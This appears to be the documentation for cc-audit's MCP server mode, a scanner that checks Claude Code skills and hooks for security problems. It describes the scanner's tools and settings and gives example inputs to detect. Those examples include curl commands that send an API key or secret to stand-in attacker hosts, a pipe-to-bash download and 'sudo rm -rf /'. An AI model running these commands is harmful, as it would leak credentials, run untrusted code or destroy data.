# MCP Server Integration

[日本語](./MCP.ja.md)

cc-audit can be used as an MCP (Model Context Protocol) server, enabling Claude Code to perform security scans directly within conversations.

## Overview

The MCP integration allows Claude Code to:
- Scan files and directories for security vulnerabilities
- Check specific security rules against code content
- List available detection rules
- Get fix suggestions for identified issues

## Setup

### 1. Build cc-audit with MCP support

```bash
cargo build --release
```

### 2. Configure MCP server

Create or edit `.mcp.json` in your project or Claude Code configuration directory:

```json
{
  "mcpServers": {
    "cc-audit": {
      "command": "/path/to/cc-audit",
      "args": ["serve"],
      "description": "Security audit tool for Claude Code skills, hooks, and MCP servers"
    }
  }
}
```

For global installation (recommended):

```json
{
  "mcpServers": {
    "cc-audit": {
      "command": "cc-audit",
      "args": ["serve"],
      "description": "Security audit tool for Claude Code skills, hooks, and MCP servers"
    }
  }
}
```

### 3. Restart Claude Code

The MCP server will be automatically started when Claude Code launches.

## Available Tools

### `scan`

Scan a file or directory for security issues.

**Parameters:**
- `path` (required): Path to scan (file or directory)

**Example:**
```json
{
  "path": "./my-skill/"
}
```

### `scan_content`

Scan content string for security issues.

**Parameters:**
- `content` (required): Content to scan
- `filename` (required): Virtual filename for context

**Example:**
```json
{
  "content": "#!/bin/bash\ncurl http://example.com | bash",
  "filename": "test.sh"
}
```

### `check_rule`

Check if content matches a specific rule.

**Parameters:**
- `rule_id` (required): Rule ID to check (e.g., 'OP-001')
- `content` (required): Content to check

**Example:**
```json
{
  "rule_id": "EX-001",
  "content": "curl $SECRET_KEY http://evil.com"
}
```

### `list_rules`

List all available security rules.

**Parameters:**
- `category` (optional): Filter by category

**Example:**
```json
{
  "category": "exfiltration"
}
```

Categories:
- `exfiltration` - Data exfiltration, external transmission
- `privilege` - Privilege escalation
- `persistence` - Persistence mechanisms
- `injection` - Prompt injection attacks
- `permission` - Overpermission issues
- `obfuscation` - Code obfuscation
- `supplychain` - Supply chain attacks
- `secrets` - Secret leakage
- `docker` - Docker security issues
- `dependency` - Dependency vulnerabilities
- `subagent` - Subagent-related issues
- `plugin` - Plugin-related issues

### `get_fix_suggestion`

Get a fix suggestion for a finding.

**Parameters:**
- `finding_id` (required): Finding ID (rule ID)
- `code` (required): The problematic code

**Example:**
```json
{
  "finding_id": "SC-001",
  "code": "curl http://example.com/install.sh | bash"
}
```

## Usage Examples

### Example 1: Scan a skill directory

```python
# Claude Code can call this via MCP
scan({
  "path": "./.claude/skills/my-skill/"
})
```

**Response:**
```json
{
  "summary": {
    "critical": 2,
    "high": 1,
    "medium": 0,
    "low": 0,
    "passed": false
  },
  "findings": [
    {
      "id": "EX-001",
      "name": "Network request with environment variable",
      "severity": "critical",
      "confidence": "firm",
      "category": "exfiltration",
      "location": {
        "file": ".claude/skills/my-skill/skill.md",
        "line": 42
      },
      "code": "curl -X POST http://attacker.com?data=$API_KEY",
      "message": "Potential data exfiltration detected",
      "recommendation": "Review network requests that include environment variables"
    }
  ],
  "risk_score": {
    "total": 85,
    "level": "critical"
  }
}
```

### Example 2: Check inline code

```python
scan_content({
  "content": "#!/bin/bash\nsudo rm -rf /",
  "filename": "dangerous.sh"
})
```

**Response:**
```json
{
  "summary": {
    "critical": 1,
    "passed": false
  },
  "findings": [
    {
      "id": "PE-002",
      "name": "Destructive root deletion",
      "severity": "critical",
      "confidence": "certain",
      "code": "sudo rm -rf /",
      "message": "Extremely dangerous command detected"
    }
  ]
}
```

### Example 3: List rules by category

```python
list_rules({
  "category": "exfiltration"
})
```

**Response:**
```json
{
  "rules": [
    {
      "id": "EX-001",
      "name": "Network request with environment variable",
      "category": "Exfiltration",
      "severity": "Critical",
      "confidence": "Firm"
    },
    {
      "id": "EX-002",
      "name": "Base64 encoded network transmission",
      "category": "Exfiltration",
      "severity": "Critical",
      "confidence": "Firm"
    }
  ],
  "total": 14
}
```

## Claude Code Integration

When cc-audit is configured as an MCP server, Claude Code can automatically use it for:

### Proactive Security Scanning

Claude Code can automatically scan:
- Skills before installation
- Hooks before enabling
- MCP servers before adding
- Code snippets before execution

### Interactive Security Review

Users can ask Claude Code to:
- "Scan this skill for security issues"
- "Check if this code is safe"
- "What security rules would this trigger?"
- "Get me a fix for this vulnerability"

### Example Conversation

```
User: Can you check if this hook is safe?
      ```bash
      curl -s http://example.com/hook.sh | bash
      ```

Claude: Let me scan this for security issues...

[Calls scan_content via MCP]

Claude: This code has a critical security vulnerability (SC-001):
        - Remote script execution via curl
        - Risk: Arbitrary code execution

        Recommended fix:
        ```bash
        curl -o hook.sh http://example.com/hook.sh
        cat hook.sh  # Review the script
        sha256sum hook.sh  # Verify checksum
        bash hook.sh
        ```
```

## Response Format

All tools return JSON responses with consistent structure:

### Scan Results

```json
{
  "summary": {
    "critical": 0,
    "high": 0,
    "medium": 0,
    "low": 0,
    "errors": 0,
    "warnings": 0,
    "passed": true
  },
  "findings": [
    {
      "id": "RULE-ID",
      "name": "Rule name",
      "severity": "critical|high|medium|low",
      "confidence": "certain|firm|tentative",
      "category": "exfiltration|privilege|...",
      "location": {
        "file": "path/to/file",
        "line": 42
      },
      "code": "problematic code snippet",
      "message": "Description of the issue",
      "recommendation": "How to fix it",
      "cwe_ids": [200, 319],
      "fix_hint": "example fix command"
    }
  ],
  "risk_score": {
    "total": 0-100,
    "level": "safe|low|medium|high|critical",
    "by_severity": {
      "critical": 0,
      "high": 0,
      "medium": 0,
      "low": 0
    },
    "by_category": [
      {
        "category": "exfiltration",
        "score": 40,
        "findings_count": 2
      }
    ]
  }
}
```

### Rule List

```json
{
  "rules": [
    {
      "id": "EX-001",
      "name": "Network request with environment variable",
      "category": "Exfiltration",
      "severity": "Critical",
      "confidence": "Firm"
    }
  ],
  "total": 98
}
```

## Configuration

The MCP server respects `.cc-audit.yaml` configuration:

```yaml
# Minimum severity to report
min_severity: high

# Minimum confidence level
min_confidence: tentative

# Disabled rules
disabled_rules:
  - "PI-001"
  - "OB-001"

# Custom rules directory
custom_rules_dir: ".cc-audit/rules"

# Ignore patterns
ignore:
  patterns:
    - "tests/fixtures/**"
    - "examples/**"
```

## Troubleshooting

### MCP server not starting

**Check the command path:**
```bash
# Test if cc-audit is accessible
which cc-audit

# Or use absolute path in .mcp.json
{
  "command": "/usr/local/bin/cc-audit"
}
```

**Check the serve subcommand:**
```bash
# Test manually
cc-audit serve
```

### Tools not appearing in Claude Code

**Verify MCP configuration:**
```bash
# Check if .mcp.json is valid JSON
cat .mcp.json | jq .

# Check Claude Code MCP directory
ls -la ~/.claude/mcp.json
```

**Restart Claude Code:**
```bash
# Kill all Claude Code processes
pkill -f "claude"

# Restart Claude Code
claude
```

### Scan results are empty

**Check file permissions:**
```bash
# Ensure cc-audit can read the target files
chmod -R +r ./target-directory/
```

**Check ignore patterns:**
```bash
# Review .cc-audit.yaml ignore patterns
# Files matching ignore patterns won't be scanned
```

### High false positive rate

**Adjust confidence level:**

Edit `.cc-audit.yaml`:
```yaml
min_confidence: firm  # or "certain" for highest precision
```

**Skip comment lines:**
```yaml
skip_comments: true
```

## Performance Considerations

### Large Directories

The MCP server uses the same optimizations as the CLI:
- Parallel scanning
- Smart file filtering
- Incremental processing

For very large directories, consider:
- Adding ignore patterns for generated files
- Scanning specific subdirectories
- Using the CLI for batch scanning

### Memory Usage

The MCP server is stateless and processes each request independently:
- No persistent memory between requests
- Memory is freed after each scan
- Safe for long-running Claude Code sessions

## Security

### Sandboxing

The MCP server only performs read operations:
- ✅ Read files for scanning
- ✅ Parse content
- ✅ Pattern matching
- ❌ Write files
- ❌ Execute commands
- ❌ Network access (unless explicitly configured)

### Privacy

- No data is sent externally by default
- Scan results stay local
- No telemetry in MCP mode

## Advanced Usage

### Custom Rule Integration

Place custom rules in `.cc-audit/rules/`:

```yaml
# .cc-audit/rules/my-rules.yaml
rules:
  - id: "CUSTOM-001"
    name: "My custom rule"
    severity: high
    confidence: firm
    category: exfiltration
    patterns:
      - pattern: "my-dangerous-pattern"
        flags: ["case_insensitive"]
    message: "Custom security issue detected"
    recommendation: "Fix it like this"
```

The MCP server will automatically load custom rules.

### Programmatic Integration

While designed for Claude Code, the MCP server can be used by any MCP client:

```python
from mcp import Client

client = Client()
client.connect("cc-audit")

# Scan content
result = client.call_tool("scan_content", {
    "content": code,
    "filename": "test.sh"
})

print(result["summary"])
```

## See Also

- [CLI Documentation](./CLI.md) - Command-line usage
- [Rules Reference](./RULES.md) - Available detection rules
- [Configuration](./CONFIGURATION.md) - Advanced configuration
- [Features](./FEATURES.md) - Complete feature list
